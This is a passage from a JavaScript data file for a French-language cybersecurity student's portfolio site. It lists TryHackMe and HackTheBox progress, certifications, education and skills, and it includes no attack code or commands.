            <p><strong>Pour débuter :</strong> Cisco Netacad (gratuit)</p>
            <p><strong>Pour progresser :</strong> TryHackMe PT1, Hack The Box CPTS, eJPT</p>
            <p><strong>Expert :</strong> OSCP, CRTA, CPTS, MalDev Academy</p>
            <p><strong>Note :</strong> Les certifications coûtent cher. Privilégiez les pratiques plutôt que théoriques. Mais attention : ne pas avoir de certification ne signifie pas être incompétent.</p>
            
            <h3>Ma Philosophie</h3>
            <p>Je m'oriente vers la Red Team tout en restant enraciné dans la Blue Team. Je vise les certifications : CRTA, eJPT, CRTO, CPTS, OSCP, CDSA, MalDev Academy.</p>
            <p>Mais la clé ? <strong>La passion d'abord, l'argent viendra ensuite.</strong> Et surtout : pratiquez autant que possible. Aucun week-end sans un CTF international.</p>
            
            <h3>Conseil Ultime</h3>
            <p>N'oubliez pas : c'est un marathon, pas un sprint. Construisez vos bases, spécialisez-vous progressivement et participez à des compétitions internationales pour accélérer votre progression.</p>
        `
    },
    'machines-overview': {
        title: "🖥️ Machines & Portfolio - Vue d'ensemble",
        icon: "🖥️",
        date: "Jan 18, 2026",
        category: "eJPT Preparation",
        difficulty: "Mixed",
        content: `
            <h2>K1llTh3m - Portfolio Machines</h2>
            <p><strong>[0x8][HACKER] 🇧🇯 eJPT Prep Student</strong></p>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <h2>📊 Statistiques Globales</h2>
            
            <h3>TryHackMe</h3>
            <ul>
                <li><strong>Rang:</strong> 211,929</li>
                <li><strong>Badges:</strong> 12</li>
                <li><strong>Streak:</strong> 16 jours</li>
                <li><strong>Rooms Complétées:</strong> 48</li>
            </ul>
            
            <h3>HackTheBox</h3>
            <ul>
                <li><strong>Niveau:</strong> Script Kiddie (FREE)</li>
                <li><strong>Pays:</strong> 🇧🇯 Bénin</li>
                <li><strong>Machines Pwned:</strong> 6</li>
                <li><strong>Sherlocks:</strong> 3</li>
                <li><strong>Challenges:</strong> 19</li>
            </ul>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <h2>🎯 TryHackMe - 48 Rooms Complétées</h2>
            
            <table style="width:100%; border-collapse:collapse; font-size: 13px;">
                <tr style="background-color: rgba(255,0,110,0.1);">
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><strong>#</strong></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><strong>Nom de la Room</strong></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><strong>Difficulté</strong></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><strong>Type</strong></td>
                </tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">1</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Careers in Cyber</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Info</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">2</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Offensive Security Intro</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">3</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Defensive Security Intro</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">4</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Linux Fundamentals 1</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">5</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Linux Fundamentals 2</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">6</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Linux Fundamentals 3</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">7</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Windows Fundamentals 1</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Info</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">8</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Windows Fundamentals 2</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Info</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">9</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Windows Fundamentals 3</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Info</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">10</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Networking Essentials</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Walkthrough</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">11</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Active Directory Basics</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">12</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Python Basics</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">13</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Python Playground</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><span style="color: #ff006e;">Hard</span></td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Challenge</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">14</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Cryptography for Dummies</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">15</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Crack the hash</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Challenge</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">16</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Pentesting Fundamentals</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">17</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Pentest+ Certificate</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Learning Path</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">18</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">OWASP Top 10</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">19</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Web Fundamentals</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">20</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Intro to Cybersecurity</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Info</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">21</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Nmap</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">22</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Metasploit</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">23</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">SQL Injection</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">24</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Cross Site Scripting</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">25</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">File Inclusion</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">26</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Command Injection</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">27</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">WebGoat</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">28</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Burp Suite</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">29</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Linux Privilege Escalation</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Hard</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">30</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Windows Privilege Escalation</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Hard</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">31</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Post Exploitation Basics</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">32</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Reverse Engineering 101</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Hard</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">33</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Cryptography Fundamentals</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">34</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Hashing Basics</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">35</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Intro to OSINT</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">36</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">DNS Exploits</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">37</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Sniffing & Spoofing</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Hard</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">38</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Network Security</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">39</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Firewalls 101</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">40</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Forensics Intro</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">41</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Memory Forensics</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Hard</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">42</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Malware Analysis</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Hard</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">43</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Network Services</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">44</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Regular Expressions</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">45</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Bash Scripting</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Medium</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">46</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Git & GitHub</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">47</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Content Security Policy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Hard</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">48</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Introduction to HTTPS</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Free</td></tr>
            </table>
            
            <p style="margin-top: 15px; font-size: 13px; color: #999;"><strong>Total: 48 Rooms ✅</strong></p>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <h2>🏆 HackTheBox - Machines Complétées (6)</h2>
            
            <table style="width:100%; border-collapse:collapse; font-size: 13px;">
                <tr style="background-color: rgba(255,0,110,0.1);">
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><strong>Nom</strong></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><strong>OS</strong></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><strong>Difficulté</strong></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><strong>Status</strong></td>
                </tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Cap</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">🐧 Linux</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">✅ Pwned</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Expressway</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">🐧 Linux</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">✅ Pwned</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Conversor</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">🐧 Linux</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">✅ Pwned</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">CodePartTwo</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">🐧 Linux</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">✅ Pwned</td></tr>
                <tr><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">MonitorsFour</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">🐧 Linux</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">✅ Pwned</td></tr>
                <tr style="background: rgba(255,0,110,0.03);"><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Eighteen</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">🐧 Linux</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Easy</td><td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">🔄 User</td></tr>
            </table>
            
            <h3 style="margin-top: 25px;">Sherlocks (3)</h3>
            <ul style="columns: 3;">
                <li>✅ Brutus</li>
                <li>✅ SecretPictures</li>
                <li>✅ Campfire-1</li>
            </ul>
            
            <h3 style="margin-top: 20px;">Challenges (19)</h3>
            <p style="font-size: 13px; color: #999;">Cryptographie, OSINT, Investigation, Stéganographie - ~50+ points</p>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <h2>📈 Progression - eJPT 2026</h2>
            
            <ul>
                <li><strong>6 Machines HTB pwned</strong></li>
                <li><strong>48 TryHackMe rooms</strong></li>
                <li><strong>3 Sherlocks HTB</strong></li>
                <li><strong>19 Challenges</strong></li>
                <li><strong>Certifications:</strong> CNSP, CRTA, CCSC, CRTOM</li>
            </ul>
            
            <p style="margin-top: 20px; font-style: italic; color: #999;">Objectif: Maîtriser les fondamentaux pour eJPT Certification</p>
            <p style="font-size: 12px; color: #999;">Dernière mise à jour: 18 janvier 2026</p>
        `
    },
    'portfolio-profile': {
        title: "Junaïd Niktab LAWANI",
        icon: "👤",
        date: "Jan 2026",
        category: "Profil Professionnel",
        difficulty: "N/A",
        isProfile: true,
        content: `
            <div style="display: grid; grid-template-columns: 1fr; gap: 30px; margin-bottom: 30px;">
                <!-- Profile Header -->
                <div style="background: linear-gradient(135deg, rgba(255, 0, 110, 0.1) 0%, rgba(16, 33, 62, 0.2) 100%); border: 1px solid rgba(255, 0, 110, 0.3); border-radius: 8px; padding: 30px; text-align: center;">
                    <h2 style="color: #ff006e; font-size: 28px; margin-bottom: 10px;">Junaïd Niktab LAWANI ✅</h2>
                    <p style="color: #ccc; font-size: 14px; margin-bottom: 20px;">Cybersecurity Student || CTF Player 🚩 || CNSP || CRTA || CCSC || CRTOM</p>
                    <div style="display: flex; flex-wrap: wrap; gap: 10px; justify-content: center;">
                        <span style="background: rgba(255, 0, 110, 0.2); border: 1px solid #ff006e; color: #ff006e; padding: 5px 12px; border-radius: 20px; font-size: 12px;">Challenge Maker</span>
                        <span style="background: rgba(255, 0, 110, 0.2); border: 1px solid #ff006e; color: #ff006e; padding: 5px 12px; border-radius: 20px; font-size: 12px;">🏆 BJSEC CTF 2024</span>
                    </div>
                </div>

            </div>
            
            <h3 style="color: #ff006e; margin-top: 30px;">📚 Formation</h3>
            <p style="color: #ccc; margin-bottom: 20px;">Mes diplômes et parcours académiques.</p>
            <table style="width: 100%; border-collapse: collapse; margin-bottom: 30px; background: rgba(22, 33, 62, 0.3);">
                <thead>
                    <tr style="background: rgba(15, 33, 62, 0.8); border-bottom: 2px solid #ff006e;">
                        <th style="color: #00d9ff; padding: 15px; text-align: left; font-weight: bold;">Diplôme</th>
                        <th style="color: #00d9ff; padding: 15px; text-align: left; font-weight: bold;">Institution</th>
                        <th style="color: #00d9ff; padding: 15px; text-align: left; font-weight: bold;">Date</th>
                        <th style="color: #00d9ff; padding: 15px; text-align: left; font-weight: bold;">Description</th>
                    </tr>
                </thead>
                <tbody>
                    <tr style="border-bottom: 1px solid rgba(255, 0, 110, 0.2);">
                        <td style="color: #ccc; padding: 15px;">BAC</td>
                        <td style="color: #ccc; padding: 15px;">CEG d'Application - Porto-Novo</td>
                        <td style="color: #ccc; padding: 15px;">2023</td>
                        <td style="color: #ccc; padding: 15px;">Diplôme de fin d'études secondaires. Classement général en série D.</td>
                    </tr>
                    <tr style="background: rgba(255, 0, 110, 0.05); border-bottom: 1px solid rgba(255, 0, 110, 0.2);">
                        <td style="color: #ccc; padding: 15px;">BEPC</td>
                        <td style="color: #ccc; padding: 15px;">CEG d'Application - Porto-Novo</td>
                        <td style="color: #ccc; padding: 15px;">2020</td>
                        <td style="color: #ccc; padding: 15px;">Brevet d'études du premier cycle. Formation complète en cycle d'observation et d'orientation.</td>
                    </tr>
                </tbody>
            </table>
            
            <h3 style="color: #ff006e; margin-top: 30px;">📜 Certifications</h3>
            <p style="color: #ccc; margin-bottom: 20px;">Cette section regroupe mes certifications professionnelles en cybersécurité ainsi que mes attestations de participation aux CTF.</p>
            <table style="width: 100%; border-collapse: collapse; margin-bottom: 30px; background: rgba(22, 33, 62, 0.3);">
                <thead>
                    <tr style="background: rgba(15, 33, 62, 0.8); border-bottom: 2px solid #ff006e;">
                        <th style="color: #00d9ff; padding: 15px; text-align: left; font-weight: bold;">Certification</th>
                        <th style="color: #00d9ff; padding: 15px; text-align: left; font-weight: bold;">Organisme</th>
                        <th style="color: #00d9ff; padding: 15px; text-align: left; font-weight: bold;">Statut</th>
                        <th style="color: #00d9ff; padding: 15px; text-align: left; font-weight: bold;">Description</th>
                    </tr>
                </thead>
                <tbody>
                    <tr style="border-bottom: 1px solid rgba(255, 0, 110, 0.2);">
                        <td style="color: #ccc; padding: 15px;">CNSP</td>
                        <td style="color: #ccc; padding: 15px;">Certified Network Security Practitioner</td>
                        <td style="color: #ccc; padding: 15px;">Obtenue</td>
                        <td style="color: #ccc; padding: 15px;">Certification professionnelle en cybersécurité axée sur la défense des réseaux.</td>
                    </tr>
                    <tr style="background: rgba(255, 0, 110, 0.05); border-bottom: 1px solid rgba(255, 0, 110, 0.2);">
                        <td style="color: #ccc; padding: 15px;">CRTA</td>
                        <td style="color: #ccc; padding: 15px;">Certified Red Team Analyst</td>
                        <td style="color: #ccc; padding: 15px;">Obtenue</td>
                        <td style="color: #ccc; padding: 15px;">Certification orientée offensive en red teaming et opérations d'équipes rouges.</td>
                    </tr>
                    <tr style="border-bottom: 1px solid rgba(255, 0, 110, 0.2);">
                        <td style="color: #ccc; padding: 15px;">CCSC</td>
                        <td style="color: #ccc; padding: 15px;">Cybersecurity Career Starter Certification</td>
                        <td style="color: #ccc; padding: 15px;">Obtenue</td>
                        <td style="color: #ccc; padding: 15px;">Certification d’introduction aux fondamentaux de la cybersécurité.</td>
                    </tr>
                    <tr style="background: rgba(255, 0, 110, 0.05);">
                        <td style="color: #ccc; padding: 15px;">CRTOM</td>
                        <td style="color: #ccc; padding: 15px;">Certified Red Team Operations Management</td>
                        <td style="color: #ccc; padding: 15px;">Obtenue</td>
                        <td style="color: #ccc; padding: 15px;">Gestion stratégique des opérations Red Team et leadership sécurité.</td>
                    </tr>
                </tbody>
            </table>
            
            
            <h3 style="color: #ff006e; margin-top: 30px;">💻 Compétences Techniques</h3>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 20px; margin: 30px 0; text-align: center;">
                <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
                    <div style="font-size: 48px;">🐍</div>
                    <p style="color: #ccc; font-weight: bold;">Python</p>
                </div>
                <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
                    <div style="font-size: 48px;">🐧</div>
                    <p style="color: #ccc; font-weight: bold;">Linux</p>
                </div>
                <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
                    <div style="font-size: 48px;">⚡</div>
                    <p style="color: #ccc; font-weight: bold;">Burp Suite</p>
                </div>
                <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
                    <div style="font-size: 48px;">👁️</div>
                    <p style="color: #ccc; font-weight: bold;">Nmap</p>
                </div>
                <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
                    <div style="font-size: 48px;">🔗</div>
                    <p style="color: #ccc; font-weight: bold;">Git</p>
                </div>
                <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
                    <div style="font-size: 48px;">👤</div>
                    <p style="color: #ccc; font-weight: bold;">Active Directory</p>
                </div>
            </div>
            
            <h3 style="color: #ff006e; margin-top: 30px;">📞 Me Contacter</h3>
            <p style="color: #ccc; text-align: center; margin: 20px 0; font-size: 15px;">Envie d'échanger sur la cybersécurité, les CTF ou collaborer sur un projet ? Je suis toujours ouvert aux discussions et partages d'expériences.</p>
            
            <div style="display: flex; justify-content: center; gap: 20px; margin: 40px 0; flex-wrap: wrap;">
                <a href="https://www.linkedin.com/in/juna%C3%AFd-niktab-lawani-484356329/" target="_blank" style="display: flex; align-items: center; justify-content: center; width: 60px; height: 60px; border: 2px solid rgba(255, 0, 110, 0.4); border-radius: 50%; cursor: pointer; transition: all 0.3s ease; text-decoration: none;" onmouseover="this.style.borderColor='#ff006e'; this.style.boxShadow='0 0 20px rgba(255, 0, 110, 0.5)';" onmouseout="this.style.borderColor='rgba(255, 0, 110, 0.4)'; this.style.boxShadow='none';">
                    <span style="font-size: 28px; color: white; font-weight: bold;">in</span>
                </a>
